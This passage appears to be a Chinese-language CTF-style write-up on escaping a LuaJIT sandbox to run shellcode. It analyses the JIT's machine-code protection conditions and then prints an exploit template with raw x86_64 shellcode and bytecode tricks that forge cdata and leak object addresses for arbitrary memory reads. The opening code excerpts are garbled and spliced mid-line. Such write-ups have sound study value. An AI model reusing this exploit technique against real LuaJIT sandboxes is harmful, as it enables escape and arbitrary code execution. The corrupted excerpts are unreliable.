关键位置:
    local i = 1
        while i  KNUM    20  11      ; 16777216  0097 ;  0097
    0095    ADDVN   19  19  12  ; 1  0091 ; parent == 0 && J->exitno == 0) {
        if (pc == J->startpc && J->framedepth + J->retdepth == 0) {
          /* Same loop? */
          if (ev == LOOPEV_LEAVE)  /* Must loop back to form a root trace. */
        lj_trace_err(J, LJ_TRERR_LLEAVE);
          lj_record_stop(J, LJ_TRLINK_LOOP, J->cur.traceno);  /* Looping trace. */
        } else if (ev != LOOPEV_LEAVE) {  /* Entering inner loop? */
          /* It's usually better to abort here and wait until the inner loop
          ** is traced. But if the inner loop repeatedly didn't loop back,
          ** this indicates a low trip count. In this case try unrolling
          ** an inner loop even in a root trace. But it's better to be a bit
          ** more conservative here and only do it for very short loops.
          */
          if (bc_j(*pc) != -1 && !innerloopleft(J, pc))
        lj_trace_err(J, LJ_TRERR_LINNER);  /* Root trace hit an inner loop. */
          if ((ev != LOOPEV_ENTERLO &&
           J->loopref && J->cur.nins - J->loopref > 24) || --J->loopunroll loopref = J->cur.nins;
        }
      } else if (ev != LOOPEV_LEAVE) {  /* Side trace enters an inner loop. */
        J->loopref = J->cur.nins;
        if (--J->loopunroll mcbot;
         13    MCode *mxpstart = mxp;
     →   14    if (mxp + (2+2)*EXITSTUBS_PER_GROUP+8+5 >= as->mctop)
         15      asm_mclimit(as);
也就是`mcbot + X >= mctop`，管他多少只要`mcbot >= mctop`就行。
条件2:
    329   /* Abort the reservation. */
        330  void lj_mcode_abort(jit_State *J)
        331  {
        332    if (J->mcarea)
     →  333      mcode_protect(J, MCPROT_RUN);
        334  }
需要`mcarea != 0`！而回想第一次，我们其实是把`mcarea`设置为0的，于是这里是不会成功触发的。
条件3(参数):
    193  /* Change protection of MCode area. */
        194  static void mcode_protect(jit_State *J, int prot)
        195  {
        196    if (J->mcprot != prot) {
     →  197      if (LJ_UNLIKELY(mcode_setprot(J->mcarea, J->szmcarea, prot)))
        198        mcode_protfail(J);
        199      J->mcprot = prot;
        200    }
        201  }
        202
那么我们参数的设置方法就基本上清楚了，这也正好印证了我们之前的设置方法正好使得这里的`mcarea`符合要求。不过我们的设置还有一个问题就是`szmcarea`太大，可以稍微改小一点，不过在mprotect的处理中即使太大也不是很影响。
另外需要注意的几个后置条件：
    →  378     if ((size_t)need > sizemcode)
        379      lj_trace_err(J, LJ_TRERR_MCODEOV);  /* Too long for any area. */
        380    if (J->szallmcarea + sizemcode > maxmcode)
        381      lj_trace_err(J, LJ_TRERR_MCODEAL);
        382    mcode_allocarea(J);
        383    lj_trace_err(J, LJ_TRERR_MCODELM);
380,381的这个条件比较关键，因为后来的分析发现如果这里出现问题是会被free掉的（有兴趣的同学可以看代码），而在zircon内发现如果被free掉会导致一个无效内存错，这样即使mprotect了也无法执行代码，因为我们需要在mprotect之后正常回到lua的执行过程，然后才能去通过调用任意c函数的方式跳到shellcode。所以在设置`szallmzarea`的时候也要注意到大小的问题。
到现在，我们就终于弄明白了为什么原来的exp是不能直接使用的了。。因为他的参数设置有问题。。
之后的err是在上一个代码片段383行位置触发的，也触发了panic的提示信息，但是发现其实这个并不会影响后面的执行过程，所以不用太在意。具体原因纠结起来感觉会更加耗费时间，我就没有继续深究下去了，不过我猜测应该是由于我们搞坏了一些`State`内的元数据，在链表中有了一些奇怪的事情发生导致的。不过还好这个err不会导致太多问题。
接下来我们就要进入到另一个硬核的世界了。。。fuchsia.
## luajit 沙箱逃逸执行shellcode exp
orig_exp.lua:
    -- The following function serves as the template for evil.lua.
    -- The general outline is to compile this function as-written, dump
    -- it to bytecode, manipulate the bytecode a bit, and then save the
    -- result as evil.lua.
    local evil = function(v)
      -- This is the x86_64 native code which we'll execute. It
      -- is a very benign payload which just prints "Hello World"
      -- and then fixes up some broken state.
      local shellcode =
        "\76\139\87\16"..       -- mov r10, [rdi+16]
        "\184\4\0\0\2"..        -- mov eax, 0x2000004
        "\191\1\0\0\0"..        -- mov edi, 1
        "\72\141\53\51\0\0\0".. -- lea rsi, [->msg]
        "\186\12\0\0\0"..       -- mov edx, 12
        "\15\5"..               -- syscall
        "\72\133\192"..         -- test rax, rax
        "\184\74\0\0\2"..       -- mov eax, 0x200004a
        "\121\12"..             -- jns ->is_osx
        "\184\1\0\0\0"..        -- mov eax, 1
        "\15\5"..               -- syscall
        "\184\10\0\0\0"..       -- mov eax, 10
                                -- ->is_osx:
        "\73\139\58"..          -- mov rdi, [r10]
        "\72\139\119\8"..       -- mov rsi, [rdi+8]
        "\186\7\0\0\0"..        -- mov edx, 7
        "\15\5"..               -- syscall
        "\73\139\114\8"..       -- mov rsi, [r10+8]
        "\72\137\55"..          -- mov [rdi], rsi
        "\195"..                -- ret
                                -- ->msg:
        "Hello World\n"
      -- The dirty work is done by the following "inner" function.
      -- This inner function exists because we require a vararg call
      -- frame on the Lua stack, and for the function associated with
      -- said frame to have certain special upvalues.
      local function inner(...)
        if false then
          -- The following three lines turn into three bytecode
          -- instructions. We munge the bytecode slightly, and then
          -- later reinterpret the instructions as a cdata object,
          -- which will end up being `cdata: NULL`.
          -- The `if false` wrapper ensures that the munged bytecode
          -- isn't executed.
          local cdata = -32749
          cdata = 0
          cdata = 0
        end
        -- Through the power of bytecode manipulation, the
        -- following three functions will become (the fast paths of)
        -- string.byte, string.char, and string.sub. This is
        -- possible because LuaJIT has bytecode instructions
        -- corresponding to the fast paths of said functions. Note
        -- that we musn't stray from the fast path (because the
        -- fallback C code won't be wired up). Also note that the
        -- interpreter state will be slightly messed up after
        -- calling one of these functions.
        local function s_byte(s) end
        local function s_char(i, _) end
        local function s_sub(s, i, j) end
        -- The following function does nothing, but calling it will
        -- restore the interpreter state which was messed up following
        -- a call to one of the previous three functions. Because this
        -- function contains a cdata literal, loading it from bytecode
        -- will result in the ffi library being initialised (but not
        -- registered in the global namespace).
        local function resync() return 0LL end
        -- Helper function to reinterpret the first four bytes of a
        -- string as a uint32_t, and return said value as a number.
        local function s_uint32(s)
          local result = 0
          for i = 4, 1, -1 do
            result = result * 256 + s_byte(s_sub(s, i, i))
            resync()
          end
          return result
        end
        -- The following line obtains the address of the GCfuncL
        -- object corresponding to "inner". As written, it just fetches
        -- the 0th upvalue, and does some arithmetic. After some
        -- bytecode manipulation, the 0th upvalue ends up pointing
        -- somewhere very interesting: the frame info TValue containing
        -- func|FRAME_VARG|delta. Because delta is small, this TValue
        -- will end up being a denormalised number, from which we can
        -- easily pull out 32 bits to give us the "func" part.
        local iaddr = (inner * 2^1022 * 2^52) % 2^32
        -- The following five lines read the "pc" field of the GCfuncL
        -- we just obtained. This is done by creating a GCstr object
        -- overlaying the GCfuncL, and then pulling some bytes out of
        -- the string. Bytecode manipulation results in a nice KPRI
        -- instruction which preserves the low 32 bits of the istr
        -- TValue while changing the high 32 bits to specify that the
        -- low 32 bits contain a GCstr*.